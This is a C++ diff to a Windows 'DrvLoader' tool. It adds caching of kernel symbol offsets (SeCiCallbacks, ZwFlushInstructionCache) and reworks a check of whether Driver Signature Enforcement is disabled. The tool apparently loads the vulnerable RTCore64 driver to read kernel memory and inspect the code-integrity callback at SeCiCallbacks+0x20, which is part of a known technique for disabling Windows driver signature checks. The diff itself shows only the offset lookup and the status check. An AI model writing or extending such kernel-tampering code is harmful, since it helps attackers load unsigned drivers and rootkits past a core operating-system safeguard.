@@ -96,6 +96,41 @@ std::optional<uint64_t> DrvLoader::GetNtoskrnlBase() {
     return std::nullopt;
 }
 
+bool DrvLoader::GetSymbolOffsets(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
+    WCHAR systemRoot[MAX_PATH];
+    GetSystemDirectoryW(systemRoot, MAX_PATH);
+    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
+    
+    // Try cached mini-PDB first
+    if (ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction)) {
+        std::wcout << L"[+] Using cached offsets from mini-PDB\n";
+        return true;
+    }
+    
+    // Download symbols if no cache
+    std::wcout << L"[*] Downloading kernel symbols...\n";
+    if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
+        std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
+        return false;
+    }
+    
+    auto seCiOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
+    auto zwFlushOffset = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
+    
+    if (!seCiOffset || !zwFlushOffset) {
+        std::wcout << L"[-] Failed to get symbol offsets\n";
+        return false;
+    }
+    
+    *seCiCallbacks = *seCiOffset;
+    *safeFunction = *zwFlushOffset;
+    
+    // Create mini-PDB for future use
+    ConfigManager::CreateWindowsMiniPdb(*seCiCallbacks, *safeFunction);
+    
+    return true;
+}
+
 std::optional<uint64_t> DrvLoader::GetKernelSymbolOffset(const std::wstring& symbolName) {
     WCHAR systemRoot[MAX_PATH];
     GetSystemDirectoryW(systemRoot, MAX_PATH);
@@ -222,9 +257,50 @@ bool DrvLoader::InstallAndStartDriver() {
     return true;
 }
 
+bool DrvLoader::TryLoadOffsetsFromCache(uint64_t* seCiCallbacks, uint64_t* safeFunction) {
+    return ConfigManager::LoadOffsetsFromWindowsMiniPdb(seCiCallbacks, safeFunction);
+}
+
 bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     std::wcout << L"\n[=== Checking DSE Status ===]\n\n";
     
+    uint64_t seCiCallbacksOffset = 0;
+    uint64_t zwFlushInstructionCacheOffset = 0;
+    bool usedCache = false;
+    
+    // Try to use cached mini-PDB first (no symbol download needed!)
+    if (TryLoadOffsetsFromCache(&seCiCallbacksOffset, &zwFlushInstructionCacheOffset)) {
+        std::wcout << L"[+] Using cached offsets from mini-PDB - no symbol download needed!\n";
+        usedCache = true;
+    } else {
+        std::wcout << L"[*] No cached offsets found, downloading symbols...\n";
+        
+        // Download symbols WITHOUT driver installation
+        WCHAR systemRoot[MAX_PATH];
+        GetSystemDirectoryW(systemRoot, MAX_PATH);
+        std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
+        
+        if (!symbolDownloader.DownloadSymbolsForModule(ntoskrnlPath)) {
+            std::wcout << L"[-] Failed to download symbols for ntoskrnl.exe\n";
+            return false;
+        }
+        
+        auto seCiCallbacksOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"SeCiCallbacks");
+        auto zwFlushInstructionCacheOpt = symbolDownloader.GetSymbolOffset(ntoskrnlPath, L"ZwFlushInstructionCache");
+        
+        if (!seCiCallbacksOpt || !zwFlushInstructionCacheOpt) {
+            std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
+            return false;
+        }
+        
+        seCiCallbacksOffset = *seCiCallbacksOpt;
+        zwFlushInstructionCacheOffset = *zwFlushInstructionCacheOpt;
+        
+        // Create mini-PDB for future use (only on first run)
+        ConfigManager::CreateWindowsMiniPdb(seCiCallbacksOffset, zwFlushInstructionCacheOffset);
+    }
+    
+    // NOW install driver for memory operations (required for status check)
     if (!InstallAndStartDriver()) {
         return false;
     }
@@ -237,16 +313,6 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     }
     std::wcout << L"[+] RTCore64 driver opened successfully\n";
     
-    auto seCiCallbacksOffset = GetKernelSymbolOffset(L"SeCiCallbacks");
-    auto zwFlushInstructionCacheOffset = GetKernelSymbolOffset(L"ZwFlushInstructionCache");
-    
-    if (!seCiCallbacksOffset || !zwFlushInstructionCacheOffset) {
-        std::wcout << L"[-] Failed to get required symbol offsets from PDB\n";
-        Cleanup();
-        StopAndRemoveDriver();
-        return false;
-    }
-    
     auto ntBase = GetNtoskrnlBase();
     if (!ntBase) {
         std::wcout << L"[-] Failed to locate ntoskrnl.exe\n";
@@ -255,8 +321,8 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
         return false;
     }
     
-    uint64_t seCiCallbacks = *ntBase + *seCiCallbacksOffset;
-    uint64_t safeFunction = *ntBase + *zwFlushInstructionCacheOffset;
+    uint64_t seCiCallbacks = *ntBase + seCiCallbacksOffset;
+    uint64_t safeFunction = *ntBase + zwFlushInstructionCacheOffset;
     uint64_t callbackAddress = seCiCallbacks + 0x20;
     
     auto currentCallback = ReadMemory64(callbackAddress);
@@ -273,48 +339,50 @@ bool DrvLoader::CheckDSEStatus(bool& isPatched) {
     std::wcout << L"[+] Safe function address: 0x" << std::hex << safeFunction << std::dec << L"\n";
     std::wcout << L"[+] DSE Status: " << (isPatched ? L"PATCHED (disabled)" : L"ACTIVE (enabled)") << L"\n";
     
-    std::wcout << L"\n[*] Saving current offsets...\n";
-    
-    bool driversIniUpdated = ConfigManager::UpdateDriversIni(*seCiCallbacksOffset, *zwFlushInstructionCacheOffset);
-    
-    WCHAR systemRoot[MAX_PATH];
-    GetSystemDirectoryW(systemRoot, MAX_PATH);
-    std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
-    
-    DWORD verHandle = 0;
-    DWORD verSize = GetFileVersionInfoSizeW(ntoskrnlPath.c_str(), &verHandle);
-    std::wstring buildInfo = L"Unknown";
-    
-    if (verSize > 0) {
-        std::vector<BYTE> verData(verSize);
-        if (GetFileVersionInfoW(ntoskrnlPath.c_str(), 0, verSize, verData.data())) {
-            VS_FIXEDFILEINFO* pFileInfo = nullptr;
-            UINT len = 0;
-            if (VerQueryValueW(verData.data(), L"\\", (LPVOID*)&pFileInfo, &len)) {
-                wchar_t ver[64];
-                swprintf_s(ver, L"%d.%d.%d.%d",
-                    HIWORD(pFileInfo->dwFileVersionMS),
-                    LOWORD(pFileInfo->dwFileVersionMS),
-                    HIWORD(pFileInfo->dwFileVersionLS),
-                    LOWORD(pFileInfo->dwFileVersionLS));
-                buildInfo = ver;
+    if (!usedCache) {
+        std::wcout << L"\n[*] Saving current offsets...\n";
+        
+        bool driversIniUpdated = ConfigManager::UpdateDriversIni(seCiCallbacksOffset, zwFlushInstructionCacheOffset);
+        
+        WCHAR systemRoot[MAX_PATH];
+        GetSystemDirectoryW(systemRoot, MAX_PATH);
+        std::wstring ntoskrnlPath = std::wstring(systemRoot) + L"\\ntoskrnl.exe";
+        
+        DWORD verHandle = 0;
+        DWORD verSize = GetFileVersionInfoSizeW(ntoskrnlPath.c_str(), &verHandle);
+        std::wstring buildInfo = L"Unknown";
+        
+        if (verSize > 0) {
+            std::vector<BYTE> verData(verSize);
+            if (GetFileVersionInfoW(ntoskrnlPath.c_str(), 0, verSize, verData.data())) {
+                VS_FIXEDFILEINFO* pFileInfo = nullptr;
+                UINT len = 0;
+                if (VerQueryValueW(verData.data(), L"\\", (LPVOID*)&pFileInfo, &len)) {
+                    wchar_t ver[64];
+                    swprintf_s(ver, L"%d.%d.%d.%d",
+                        HIWORD(pFileInfo->dwFileVersionMS),
+                        LOWORD(pFileInfo->dwFileVersionMS),
+                        HIWORD(pFileInfo->dwFileVersionLS),
+                        LOWORD(pFileInfo->dwFileVersionLS));
+                    buildInfo = ver;
+                }
             }
         }
-    }
-    
-    bool registrySaved = ConfigManager::SaveOffsetsToRegistry(*seCiCallbacksOffset, *zwFlushInstructionCacheOffset, buildInfo);
-    
-    std::wcout << L"\n[*] Offset save summary:\n";
-    if (driversIniUpdated) {
-        std::wcout << L"    [+] drivers.ini updated\n";
-    } else {
-        std::wcout << L"    [-] drivers.ini not found or failed to update\n";
-    }
-    
-    if (registrySaved) {
-        std::wcout << L"    [+] Registry updated (HKCU\\Software\\drvloader)\n";
-    } else {
-        std::wcout << L"    [-] Registry update failed\n";
+        
+        bool registrySaved = ConfigManager::SaveOffsetsToRegistry(seCiCallbacksOffset, zwFlushInstructionCacheOffset, buildInfo);
+        
+        std::wcout << L"\n[*] Offset save summary:\n";
+        if (driversIniUpdated) {
+            std::wcout << L"    [+] drivers.ini updated\n";
+        } else {
+            std::wcout << L"    [-] drivers.ini not found or failed to update\n";
+        }
+        
+        if (registrySaved) {
+            std::wcout << L"    [+] Registry updated (HKCU\\Software\\drvloader)\n";
+        } else {
+            std::wcout << L"    [-] Registry update failed\n";
+        }
     }
     
     Cleanup();
